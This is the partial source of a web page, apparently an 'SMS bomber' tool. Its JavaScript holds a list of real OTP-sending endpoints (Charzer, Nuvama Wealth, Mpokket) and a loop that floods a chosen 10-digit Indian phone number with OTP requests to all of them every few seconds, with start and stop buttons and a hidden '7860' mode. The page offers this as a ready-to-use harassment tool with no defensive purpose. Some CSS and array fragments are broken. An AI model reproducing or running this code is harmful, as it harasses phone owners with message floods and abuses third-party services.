      font-weight: 500;
      text-align: center;
      background: #1f1f1f;
      border: 2px solid #444;
      border-radius: 12px;
      color: #fff;
    }

    input:focus {
      border-color: #00cccc;
      outline: none;
    }

    .btn-container {
      margin: 25px 0;
      display: flex;
      gap: 15px;
      justify-content: center;
      flex-wrap: wrap;
    }

      font-weight: 700;

      color: #fff;
      border: 2px solid #555;

    #stopBtn { border-color: #ff3366; display: none; }
    #stopBtn:hover { background: #ff3366; color: #fff; }

      margin: 15px 0;
      color: #bbbbbb;

      border-radius: 12px;
      padding: 16px;
      max-height: 340px;
      overflow-y: auto;
      text-align: left;
      font-size: 0.98rem;
      color: #00ddaa;
      line-height: 1.5;
    }

    .neon-line {
      position: absolute;
      height: 2px;
      background: linear-gradient(90deg, transparent, #00aaaa, transparent);
      animation: scan 7s linear infinite;
    }

      {name:"Charzer", url:"https://api.charzer.com/auth-service/send-otp", method:"POST", headers:{"Content-Type":"application/json"}, data:p=>`{"mobile":"${p}","appSource":"CHARZER_APP"}`},
      {name:"Nuvama Wealth", url:"https://nma.nuvamawealth.com/edelmw-content/content/otp/register", method:"POST", headers:{"Content-Type":"application/json"}, data:p=>`{"mobileNo":"${p}","emailID":"test@example.com"}`},
      {name:"Mpokket", url:"https://web-api.mpokket.in/registration/sendOtp", method:"POST", headers:{"Content-Type":"application/json"}, data:p=>`{"mobile":"${p}"}`}
    ];

    let interval = null;
    let count = 0;

    function log(message, color = "#00ffcc") {
      const logDiv = document.getElementById('log');
      const time = new Date().toLocaleTimeString('en-IN');
      logDiv.innerHTML += `<span style="color:\( {color}">[ \){time}] ${message}</span><br>`;
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function sendBomb(api, phone) {
      try {
        let url = typeof api.url === 'function' ? api.url(phone) : api.url;
        let body = api.data ? (typeof api.data === 'function' ? api.data(phone) : api.data) : null;

        const options = {
          method: api.method,
          headers: api.headers || {},
          mode: 'cors'
        };

        if (body && api.method !== "GET") options.body = body;

        const res = await fetch(url, options);
        if (res.ok) {
          log(`✅ ${api.name} → SUCCESS`, "#00ff88");
        } else {
          log(`⚠️ ${api.name} → ${res.status}`, "#ffdd00");
        }
      } catch (e) {
        log(`❌ ${api.name} → FAILED`, "#ff4444");
      }
    }

    function handleStart() {
      const phone = document.getElementById('phone').value.trim();

      if (phone === "7860") {
        log("🔍 7860 SPECIAL MODE - History Hidden", "#ffff00");
        document.getElementById('status').innerHTML = `📜 SECRET HISTORY MODE`;
        document.getElementById('status').style.color = "#ffff00";
        return;
      }

      if (!/^\d{10}$/.test(phone)) {
        alert("❌ Please enter valid 10 digit Indian number!");
        return;
      }

      document.getElementById('startBtn').style.display = 'none';
      document.getElementById('stopBtn').style.display = 'inline-block';

      document.getElementById('status').innerHTML = `🚀 BOMBING ACTIVE ON <span style="color:#00ffff">${phone}</span>`;
      document.getElementById('status').style.color = "#00ff88";

      log(`🚀 BOMBING STARTED ON ${phone}`, "#ffffff");

      count = 0;
      interval = setInterval(() => {
        count++;
        log(`🔥 ROUND ${count} - Sending to all APIs...`, "#00ffff");
        ULTIMATE_APIS.forEach(api => sendBomb(api, phone));
      }, 2800);
    }

    function stopBombing() {
      if (interval) {
        clearInterval(interval);
        interval = null;
      }
      document.getElementById('startBtn').style.display = 'inline-block';
      document.getElementById('stopBtn').style.display = 'none';

      document.getElementById('status').innerHTML = `⛔ BOMBING STOPPED`;
      document.getElementById('status').style.color = "#ff3366";
      log("⛔ BOMBING STOPPED BY USER", "#ff3366");
    }

    window.onload = () => {
      document.getElementById('phone').focus();
    };
  </script>
</body>
